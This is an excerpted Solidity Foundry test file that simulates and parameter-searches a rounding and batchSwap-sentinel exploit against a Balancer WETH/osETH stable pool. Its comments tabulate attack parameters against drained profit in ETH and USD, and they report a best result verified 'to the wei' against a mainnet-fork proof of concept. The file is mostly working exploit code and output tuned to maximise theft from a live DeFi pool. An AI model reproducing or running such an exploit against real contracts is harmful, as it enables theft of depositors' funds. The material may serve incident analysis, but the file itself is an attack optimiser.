...
contract SearchParams is Test {
    ...
    function simulateOneRoundSentinel(uint256 balWETH, uint256 balOSETH, uint256 trickAmt, uint256 prevSwap3In, bool prevTokenIsOsETH, bool hasPrevious)
        external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 outSwap3In, bool outTokenIsOsETH, bool outHasPrevious)
    {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        ...
        if (out1 == 0) {
            // Balancer Vault batchSwap amount==0 multihop sentinel (Swaps.sol _swapWithPools, L235-244):
            // reuse the previous step's calculated amount, applying the Vault's two guards.
            // L240 UNKNOWN_AMOUNT_IN_FIRST_SWAP: `i > 0` -- a previous batchSwap step must exist. This is a
            // POSITIONAL check; in this attack phase-1 always precedes phase-2, so hasPrevious is always
            // true here (it could only fail if this were the batchSwap's very first step).
            require(hasPrevious, "UNKNOWN_AMOUNT_IN_FIRST_SWAP");
            // L241-242 MALCONSTRUCTED_MULTIHOP_SWAP: current given token (GIVEN_OUT -> tokenOut = osETH)
            // must equal the previous calculated token. That token is osETH iff the previous step was a
            // swap-3 (osETH->WETH); at round 0 the previous step is phase-1 (calc token = BPT) so prevTokenIsOsETH
            // is false and this correctly reverts, matching the Vault.
            require(prevTokenIsOsETH, "MALCONSTRUCTED_MULTIHOP_SWAP");
            out1 = prevSwap3In; // = previousAmountCalculated
        }
        ...
        // Swap 3: osETH(1) -> WETH(0), truncation + 9/10 retry; capture osETH-in as next round's
        // previousAmountCalculated (GIVEN_OUT calculated token = tokenIn = osETH -> outTokenIsOsETH=true).
        try this._computeSwap3WithIn(bal[0], bal[1]) returns (uint256, uint256 w, uint256 o, uint256 osethIn) {
            return (w, o, osethIn, true, true);
        } catch {revert("Swap 3 failed");}
    }
    ...
    function test_searchTkProfit() public {
        ...
        for (uint256 R = loR; R <= hiR; R += stepR) {
            ...
            for (uint256 k = kMin; k <= kMax; k++) {
                ...
                uint256 bO = R;
                uint256 rounds = 0;
                uint256 prevS3 = 0; bool prevIsOs = false; bool hasPrev = true; // previous* for amount==0 sentinel (phase-1 always precedes phase-2)
                for (uint256 r = 0; r < N; r++) {
                    try this.simulateOneRoundSentinel(bW, bO, tk, prevS3, prevIsOs, hasPrev) returns (uint256 w, uint256 o, uint256 s3in, bool isOs, bool hp) {
                        bW = w; bO = o; prevS3 = s3in; prevIsOs = isOs; hasPrev = hp; rounds++;
                    } catch { break; }
                }
        ...
        internal pure returns (uint256[] memory amounts, uint256 count)
    {
        ...
        // WETH = 3883 USD, osETH = 4082 USD
        // max(1e8 + 1e3 * n) <= 1e22, n = 4,  max = 1e20  (1st: 4814 WETH + 6747 osETH = 46234016 USD)
        // max(1e7 + 1e3 * n) <= 1e22, n = 5,  max = 1e22  (6th: 4921 WETH + 6593 osETH = 46020869 USD)
        // max(1e6 + 1e3 * n) <= 1e22, n = 5,  max = 1e21  (2nd: 4828 WETH + 6733 osETH = 46231230 USD)
        // max(1e5 + 1e3 * n) <= 1e22, n = 5,  max = 1e20  (3rd: 4807 WETH + 6745 osETH = 46198671 USD)
        // max(1e4 + 1e3 * n) <= 1e22, n = 6,  max = 1e22  (7th: 4623 WETH + 6851 osETH = 45916891 USD)  *REAL PROFIT*
        // max(1e3 + 1e3 * n) <= 1e22, n = 6,  max = 1e21  (4th: 4782 WETH + 6751 osETH = 46126088 USD)
        // max(1e2 + 1e3 * n) <= 1e22, n = 6,  max = 1e20  (5th: 4797 WETH + 6730 osETH = 46098611 USD)
        // max(1e1 + 1e3 * n) <= 1e22, n = 7,  max = 1e22  (8th: 4921 WETH + 6535 osETH = 45784113 USD)

        // max(1e8 + 1e2 * n) <= 1e22, n = 7,  max = 1e22  (2nd: 4911 WETH + 6652 osETH = 46222877 USD)
        // max(1e7 + 1e2 * n) <= 1e22, n = 7,  max = 1e21  (1st: 4823 WETH + 6739 osETH = 46236307 USD)  *MAX PROFIT*
        // max(1e6 + 1e2 * n) <= 1e22, n = 8,  max = 1e22  (3rd: 4711 WETH + 6841 osETH = 46217775 USD)
        // max(1e5 + 1e2 * n) <= 1e22, n = 8,  max = 1e21  (4th: 4799 WETH + 6754 osETH = 46204345 USD)
        // max(1e4 + 1e2 * n) <= 1e22, n = 9,  max = 1e22  (5th: 4910 WETH + 6631 osETH = 46133272 USD)
        // max(1e3 + 1e2 * n) <= 1e22, n = 9,  max = 1e21  (6th: 4807 WETH + 6721 osETH = 46100703 USD)
        // max(1e2 + 1e2 * n) <= 1e22, n = 10, max = 1e22  (7th: 4662 WETH + 6838 osETH = 46015262 USD)
        // max(1e1 + 1e2 * n) <= 1e22, n = 10, max = 1e21  (8th: 4769 WETH + 6731 osETH = 45993969 USD)

        // max(1e8 + 1e1 * n) <= 1e22, n = 14, max = 1e22  (2nd: 4719 WETH + 6818 osETH = 46154953 USD)
        // max(1e7 + 1e1 * n) <= 1e22, n = 15, max = 1e22  (1st: 4887 WETH + 6659 osETH = 46158259 USD)
        // max(1e6 + 1e1 * n) <= 1e22, n = 16, max = 1e22  (3rd: 4718 WETH + 6818 osETH = 46151070 USD)
        // max(1e5 + 1e1 * n) <= 1e22, n = 17, max = 1e22  (4th: 4885 WETH + 6652 osETH = 46121919 USD)
        ...
        // New approach: change amount[0] from '1e4' to '1e8' and swap order: WETH (1e8) -> osETH -> *osETH* -> *WETH* -> *osETH* -> osETH -> WETH -> osETH -> WETH
    ...
    function test_detailedTokenBreakdown() public {
        ...
        //     #1     (86, 240000)         11659.2702     +1.608%        no   <- MAX for remain<=250000
        ...
        //   #19, and this grid's max beats the baseline by just +1.608% (~184.55 ETH).
        ...
        //
        //   EXTENDED-REMAIN SEARCH (same k in [1,300], step 1000): (86,240000) is the max only for
        //   remain<=250000. Pushing remain higher:
        //     - remain in [250000,500000]: exactly ONE viable combo —
        //           (17, 333000) = 11684.9258 ETH  (= 11684925825337655994568 wei)   <- HIGHEST VERIFIED
        //       = +25.66 ETH over (86,240000). Every OTHER cell in that range reverts (fails the
        //       30-round / repay gates). This winner is TPL (trickAmt=17). Total-level double-engine
        //       verified: search == real mainnet-fork DHL PoC, exact to the wei
        //       (WETH 4833.480902696347848719 + osETH 6851.444922641308145849).
        //     - remain in [500000,700000]: ZERO viable combos.
        //   So the highest verified profit across all tested remain is (17, 333000) = 11684.9258 ETH.
        //
        ...
        // trickAmt at a higher (fragile) remain yields more raw profit; the max for remain<=250000 is
        // (86, 240000)=11659.27 ETH, and the highest verified overall is (17, 333000)=11684.93 ETH.
        // ─────────────────────────────────────────────────────────────────────────
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        ...
        uint256 prevS3 = 0; bool prevIsOs = false; bool hasPrev = true; // previous* for amount==0 sentinel (phase-1 always precedes phase-2)
        for (uint256 r = 0; r < N; r++) {
            (bW, bO, prevS3, prevIsOs, hasPrev) = this.simulateOneRoundSentinel(bW, bO, trickAmt, prevS3, prevIsOs, hasPrev);
